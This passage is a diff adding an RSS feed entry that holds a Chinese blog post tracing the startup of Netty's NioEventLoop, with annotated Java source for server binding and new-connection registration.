@@ -9,6 +9,1217 @@
 <link></link>
 <description>代码改变世界</description>
 <item>
+<title>Netty源码分析之NioEventLoop(二)—NioEventLoop的启动 - bigfan</title>
+<link>http://www.cnblogs.com/dafanjoy/p/10507393.html</link>
+<guid isPermaLink="true" >http://www.cnblogs.com/dafanjoy/p/10507393.html</guid>
+<description>&lt;p&gt;上篇文章中我们对Netty中NioEventLoop创建流程与源码进行了跟踪分析。本篇文章中我们接着分析NioEventLoop的启动流程；&lt;/p&gt;
+&lt;p&gt;Netty中会在服务端启动和新连接接入时通过chooser选择器，分别为NioServerSocketChannel与NioSocketChannel选择绑定一个NioEventLoop，接下来我们就分别从这两个方面梳理NioEventLoop的启动源码&lt;/p&gt;
+&lt;p&gt;一、服务端启动&lt;/p&gt;
+&lt;p&gt;首先我们结合下图看下Netty服务启动过程中，NioServerSocketChannel绑定的NioEventLoop启动流程&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780676/201903/780676-20190312212826820-2129904482.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;bind()部分源码我们在之前服务端启动过程中进行过说明，我们进一步跟踪进入doBind0()方法中可以看到channel.eventLoop().execute的执行，需要说明的是这里其实启动的NioServerSocketChannel绑定的 bossGroup，用来负责处理新连接接入的。&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
+&lt;pre&gt;
+    &lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
+     * read by jsf
+     * 
+     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; regFuture
+     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; channel
+     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; localAddress
+     * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; promise
+     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
+    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; doBind0(&lt;span&gt;final&lt;/span&gt; ChannelFuture regFuture, &lt;span&gt;final&lt;/span&gt; Channel channel, &lt;span&gt;final&lt;/span&gt;&lt;span&gt; SocketAddress localAddress,
+            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt;&lt;span&gt; ChannelPromise promise) {
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;该方法向 NioServerSocketChannel 的 eventLoop 提交了一个任务，当 future(其实就是 promise) 成功后执行
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;NioServerSocketChannel 的 bind 方法，并添加一个关闭监听器。我们主要关注 bind 方法。
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This method is invoked before channelRegistered() is triggered. Give user
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; handlers a chance to set up
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the pipeline in its channelRegistered() implementation.&lt;/span&gt;
+        channel.eventLoop().execute(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
+            @Override
+            &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
+                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (regFuture.isSuccess()) {
+                    
+                    channel.bind(localAddress, promise).addListener(ChannelFutureListener.CLOSE_ON_FAILURE);
+                } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
+                    promise.setFailure(regFuture.cause());
+                }
+            }
+        });
+    }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;进入NioEventLoop父类SingleThreadEventExecutor中的execute方法，改方法通过inEventLoop()会首先判断当前的线程是否是NioEventLoop本身绑定的线程，结合inEventLoop的代码可以看到NioEventLoop本身线程还未初始化为空，这里返回false，执行启动线程操作，同时会任务放入任务队列中。&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;    @Override
+    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; execute(Runnable task) {
+        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (task == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
+            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; NullPointerException(&quot;task&quot;&lt;span&gt;);
+        }
+
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;首先判断当前线程是否是该EventLoop绑定的线程&lt;/span&gt;
+        &lt;span&gt;boolean&lt;/span&gt; inEventLoop =&lt;span&gt; inEventLoop();
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;把传入的任务加入任务对立&lt;/span&gt;
+&lt;span&gt;        addTask(task);
+        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!inEventLoop) {&lt;span&gt;//&lt;/span&gt;&lt;span&gt;如果不是同一条线程&lt;/span&gt;
+&lt;span&gt;            startThread();
+            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (isShutdown() &amp;amp;&amp;amp;&lt;span&gt; removeTask(task)) {
+                reject();
+            }
+        }
+
+        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!addTaskWakesUp &amp;amp;&amp;amp;&lt;span&gt; wakesUpForTask(task)) {
+            wakeup(inEventLoop);
+        }
+    }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;    @Override
+    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; inEventLoop(Thread thread) {
+        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; thread == &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.thread;
+    }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt; 继续跟踪进入startThread()方法中&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
+&lt;pre&gt;
+    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; startThread() {
+        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (state ==&lt;span&gt; ST_NOT_STARTED) {
+            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (STATE_UPDATER.compareAndSet(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, ST_NOT_STARTED, ST_STARTED)) {
+                &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+                    doStartThread();
+                } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable cause) {
+                    STATE_UPDATER.set(&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, ST_NOT_STARTED);
+                    PlatformDependent.throwException(cause);
+                }
+            }
+        }
+    }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt; 在 doStartThread()中主要实现了以下功能：&lt;/p&gt;
+&lt;p&gt;1、执行传入的ThreadPerTaskExecutor的execute方法，创建一个新的线程，并与这个NioEventLoop对象绑定；&lt;/p&gt;
+&lt;p&gt;2、在开启的线程中执行SingleThreadEventExecutor.this.run()，也就是NioEventLoop的run方法，开始NioEventLoop的执行操作；&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
+&lt;pre&gt;
+    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; doStartThread() {
+        &lt;/span&gt;&lt;span&gt;assert&lt;/span&gt; thread == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
+        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;线程执行器通过线程工厂创建线程&lt;/span&gt;
+        executor.execute(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
+            @Override
+            &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;开启线程，并赋值&lt;/span&gt;
+                thread =&lt;span&gt; Thread.currentThread();
+                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (interrupted) {
+                    thread.interrupt();
+                }
+
+                &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt; success = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
+                updateLastExecutionTime();
+                &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;执行NioEventLoop的run方法&lt;/span&gt;
+                    SingleThreadEventExecutor.&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.run();
+                    success &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
+                } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
+                    logger.warn(&lt;/span&gt;&quot;Unexpected exception from an event executor: &quot;&lt;span&gt;, t);
+                } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
+                    &lt;/span&gt;&lt;span&gt;for&lt;/span&gt;&lt;span&gt; (;;) {
+                        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; oldState =&lt;span&gt; state;
+                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oldState &amp;gt;= ST_SHUTTING_DOWN ||&lt;span&gt; STATE_UPDATER.compareAndSet(
+                                SingleThreadEventExecutor.&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, oldState, ST_SHUTTING_DOWN)) {
+                            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
+                        }
+                    }
+
+                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Check if confirmShutdown() was called at the end of the loop.&lt;/span&gt;
+                    &lt;span&gt;if&lt;/span&gt; (success &amp;amp;&amp;amp; gracefulShutdownStartTime == 0&lt;span&gt;) {
+                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.isErrorEnabled()) {
+                            logger.error(&lt;/span&gt;&quot;Buggy &quot; + EventExecutor.&lt;span&gt;class&lt;/span&gt;.getSimpleName() + &quot; implementation; &quot; +&lt;span&gt;
+                                    SingleThreadEventExecutor.&lt;/span&gt;&lt;span&gt;class&lt;/span&gt;.getSimpleName() + &quot;.confirmShutdown() must &quot; +
+                                    &quot;be called before run() implementation terminates.&quot;&lt;span&gt;);
+                        }
+                    }
+
+                    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Run all remaining tasks and shutdown hooks.&lt;/span&gt;
+                        &lt;span&gt;for&lt;/span&gt;&lt;span&gt; (;;) {
+                            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (confirmShutdown()) {
+                                &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
+                            }
+                        }
+                    } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
+                        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+                            cleanup();
+                        } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
+                            STATE_UPDATER.set(SingleThreadEventExecutor.&lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;, ST_TERMINATED);
+                            threadLock.release();
+                            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;taskQueue.isEmpty()) {
+                                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (logger.isWarnEnabled()) {
+                                    logger.warn(&lt;/span&gt;&quot;An event executor terminated with &quot; +
+                                            &quot;non-empty task queue (&quot; + taskQueue.size() + ')'&lt;span&gt;);
+                                }
+                            }
+
+                            terminationFuture.setSuccess(&lt;/span&gt;&lt;span&gt;null&lt;/span&gt;&lt;span&gt;);
+                        }
+                    }
+                }
+            }
+        });
+    }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;OK到这一步，基于服务端启动绑定端口的NioServerSocketChannel，也就是服务端Channel绑定的NioEventLoop已经启动。&lt;/p&gt;
+&lt;p&gt;二、新连接接入&lt;/p&gt;
+&lt;p&gt;首先我们结合下图看下当有客户端接入时，创建NioSocketChannel，然后绑定NioEventLoop并启动的流程&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/780676/201903/780676-20190323102914103-1658375837.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;服务端启动时会在NioServerSocketChannel的任务链中添加ServerBootstrapAcceptor对象，这就是用来处理新新连接接入的&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
+&lt;pre&gt;
+        p.addLast(&lt;span&gt;new&lt;/span&gt; ChannelInitializer&amp;lt;Channel&amp;gt;&lt;span&gt;() {
+            @Override
+            &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; initChannel(&lt;span&gt;final&lt;/span&gt; Channel ch) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
+                &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; ChannelPipeline pipeline =&lt;span&gt; ch.pipeline();
+                ChannelHandler handler &lt;/span&gt;=&lt;span&gt; config.handler();
+                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (handler != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
+                    pipeline.addLast(handler);
+                }
+
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 服务端NioServerSocketChannel的pipeline中添加ServerBootstrapAcceptor&lt;/span&gt;
+                ch.eventLoop().execute(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Runnable() {
+                    @Override
+                    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
+                        pipeline.addLast(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ServerBootstrapAcceptor(
+                                ch, currentChildGroup, currentChildHandler, currentChildOptions, currentChildAttrs));
+                    }
+                });
+            }
+        });&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;在新连接接入事件触发时，执行unsafe.read();&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
+&lt;pre&gt;
+   &lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; processSelectedKey(SelectionKey k, AbstractNioChannel ch) {
+        &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; AbstractNioChannel.NioUnsafe unsafe =&lt;span&gt; ch.unsafe();
+        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;k.isValid()) {
+            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt;&lt;span&gt; EventLoop eventLoop;
+            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+                eventLoop &lt;/span&gt;=&lt;span&gt; ch.eventLoop();
+            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable ignored) {
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; If the channel implementation throws an exception because there is no event loop, we ignore this
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; because we are only trying to determine if ch is registered to this event loop and thus has authority
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to close ch.&lt;/span&gt;
+                &lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
+            }
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Only close ch if ch is still registered to this EventLoop. ch could have deregistered from the event loop
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; and thus the SelectionKey could be cancelled as part of the deregistration process, but the channel is
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; still healthy and should not be closed.
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/5125&lt;/span&gt;
+            &lt;span&gt;if&lt;/span&gt; (eventLoop != &lt;span&gt;this&lt;/span&gt; || eventLoop == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
+                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
+            }
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; close the channel if the key is not valid anymore&lt;/span&gt;
+&lt;span&gt;            unsafe.close(unsafe.voidPromise());
+            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
+        }
+
+        &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+            &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; readyOps =&lt;span&gt; k.readyOps();
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; We first need to call finishConnect() before try to trigger a read(...) or write(...) as otherwise
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the NIO JDK channel implementation may throw a NotYetConnectedException.&lt;/span&gt;
+            &lt;span&gt;if&lt;/span&gt; ((readyOps &amp;amp; SelectionKey.OP_CONNECT) != 0&lt;span&gt;) {
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; remove OP_CONNECT as otherwise Selector.select(..) will always return without blocking
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/924&lt;/span&gt;
+                &lt;span&gt;int&lt;/span&gt; ops =&lt;span&gt; k.interestOps();
+                ops &lt;/span&gt;&amp;amp;= ~&lt;span&gt;SelectionKey.OP_CONNECT;
+                k.interestOps(ops);
+
+                unsafe.finishConnect();
+            }
+
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Process OP_WRITE first as we may be able to write some queued buffers and so free memory.&lt;/span&gt;
+            &lt;span&gt;if&lt;/span&gt; ((readyOps &amp;amp; SelectionKey.OP_WRITE) != 0&lt;span&gt;) {
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Call forceFlush which will also take care of clear the OP_WRITE once there is nothing left to write&lt;/span&gt;
+&lt;span&gt;                ch.unsafe().forceFlush();
+            }
+
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Also check for readOps of 0 to workaround possible JDK bug which may otherwise lead
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; to a spin loop
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;新连接接入&lt;/span&gt;
+            &lt;span&gt;if&lt;/span&gt; ((readyOps &amp;amp; (SelectionKey.OP_READ | SelectionKey.OP_ACCEPT)) != 0 || readyOps == 0&lt;span&gt;) {
+                unsafe.read();
+            }
+        } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (CancelledKeyException ignored) {
+            unsafe.close(unsafe.voidPromise());
+        }
+    }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;unsafe.read()的具体实现为NioMessageUnsafe中的read()，在read()方法中主要实现了两个功能：&lt;/p&gt;
+&lt;p&gt;1、创建客户端Channel，也就是NioSocketChannel；&lt;/p&gt;
+&lt;p&gt;2、开始服务端NioServerSocketChannel的任务链传递，首先执行之前已经加入任务链的ServerBootstrapAcceptor中的channelRead&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;        @Override
+        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; read() {
+            &lt;/span&gt;&lt;span&gt;assert&lt;/span&gt;&lt;span&gt; eventLoop().inEventLoop();
+            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; ChannelConfig config =&lt;span&gt; config();
+            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; ChannelPipeline pipeline =&lt;span&gt; pipeline();
+            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; RecvByteBufAllocator.Handle allocHandle =&lt;span&gt; unsafe().recvBufAllocHandle();
+            allocHandle.reset(config);
+
+            &lt;/span&gt;&lt;span&gt;boolean&lt;/span&gt; closed = &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
+            Throwable exception &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
+            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+                &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+                    &lt;/span&gt;&lt;span&gt;do&lt;/span&gt;&lt;span&gt; {
+                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里创建客户端连接,也就是NioSocketChannelChannel&lt;/span&gt;
+                        &lt;span&gt;int&lt;/span&gt; localRead =&lt;span&gt; doReadMessages(readBuf);
+                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (localRead == 0&lt;span&gt;) {
+                            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
+                        }
+                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (localRead &amp;lt; 0&lt;span&gt;) {
+                            closed &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
+                            &lt;/span&gt;&lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
+                        }
+
+                        allocHandle.incMessagesRead(localRead);
+                    } &lt;/span&gt;&lt;span&gt;while&lt;/span&gt;&lt;span&gt; (allocHandle.continueReading());
+                } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
+                    exception &lt;/span&gt;=&lt;span&gt; t;
+                }
+
+                &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; size =&lt;span&gt; readBuf.size();
+                &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; size; i ++&lt;span&gt;) {
+                    readPending &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
+                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;在这里开始NioServerSocketChannel的任务链传递，会首先执行ServerBootstrapAcceptor中的channelRead&lt;/span&gt;
+&lt;span&gt;                    pipeline.fireChannelRead(readBuf.get(i));
+                }
+                readBuf.clear();
+                allocHandle.readComplete();
+                pipeline.fireChannelReadComplete();
+
+                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (exception != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
+                    closed &lt;/span&gt;=&lt;span&gt; closeOnReadError(exception);
+
+                    pipeline.fireExceptionCaught(exception);
+                }
+
+                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (closed) {
+                    inputShutdown &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
+                    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isOpen()) {
+                        close(voidPromise());
+                    }
+                }
+            } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Check if there is a readPending which was not processed yet.
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; This could be for two reasons:
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; * The user called Channel.read() or ChannelHandlerContext.read() in channelRead(...) method
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; * The user called Channel.read() or ChannelHandlerContext.read() in channelReadComplete(...) method
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
+                &lt;span&gt;//&lt;/span&gt;&lt;span&gt; See &lt;/span&gt;&lt;span&gt;https://github.com/netty/netty/issues/2254&lt;/span&gt;
+                &lt;span&gt;if&lt;/span&gt; (!readPending &amp;amp;&amp;amp; !&lt;span&gt;config.isAutoRead()) {
+                    removeReadOp();
+                }
+            }
+        }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;接下来在ServerBootstrapAcceptor中的channelRead中会获取到传入的NioSocketChannel，针对NioSocketChannel主要会执行以下操作：&lt;/p&gt;
+&lt;p&gt;1、配置childHandler任务链；&lt;/p&gt;
+&lt;p&gt;2、配置childOptions；&lt;/p&gt;
+&lt;p&gt;3、为NioSocketChannel分配NioEventLoop&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;        @Override
+        @SuppressWarnings(&lt;/span&gt;&quot;unchecked&quot;&lt;span&gt;)
+        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; channelRead(ChannelHandlerContext ctx, Object msg) {
+            &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; Channel child =&lt;span&gt; (Channel) msg;
+
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;配置childHandler任务链&lt;/span&gt;
+&lt;span&gt;            child.pipeline().addLast(childHandler);
+
+
+            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;配置childOptions&lt;/span&gt;
+&lt;span&gt;            setChannelOptions(child, childOptions, logger);
+
+            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (Entry&amp;lt;AttributeKey&amp;lt;?&amp;gt;, Object&amp;gt;&lt;span&gt; e: childAttrs) {
+                child.attr((AttributeKey&lt;/span&gt;&amp;lt;Object&amp;gt;&lt;span&gt;) e.getKey()).set(e.getValue());
+            }
+
+            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
+                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;为新连接分配NioEventLoop，并启动执行&lt;/span&gt;
+                childGroup.register(child).addListener(&lt;span&gt;new&lt;/span&gt;&lt;span&gt; ChannelFutureListener() {
+                    @Override
+                    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; operationComplete(ChannelFuture future) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception {
+                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;future.isSuccess()) {
+                            forceClose(child, future.cause());
+                        }
+                    }
+                });
+            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
+                forceClose(child, t);
+            }
+        }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;看以看到EventLoopGroup中register具体实实现：&lt;/p&gt;
+&lt;p&gt;1、关于next()，我们之前讲过是专门用来分配NioEventLoop；&lt;/p&gt;
+&lt;p&gt;2、register()主要负责了EventLoop的绑定和启动；&lt;/p&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;   @Override
+    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ChannelFuture register(ChannelPromise promise) {
+        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; next().register(promise);
+    }&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
+&lt;pre&gt;
+&lt;span&gt;        @Override
+        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; register(EventLoop eventLoop, &lt;span&gt;final&lt;/span&gt;&lt;span&gt; ChannelPromise promise) {
+            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (eventLoop == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
+                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; NullPointerException(&quot;eventLoop&quot;&lt;span&gt;);
+            }
+            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (isRegistered()) {
+                promise.setFailure(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; IllegalStateException(&quot;registered to an event loop already&quot;&lt;span&gt;));
+                &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt;;
+            }
+            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;isCompatible(eventLoop)) {
+                promise.setFailure(
+                        &lt;/span&gt;&lt;span&gt;new&lt;/span&gt; IllegalStateException(&quot;incompatible event loop type: &quot; +&lt;span&gt; eventLoop.getClass().getName()));
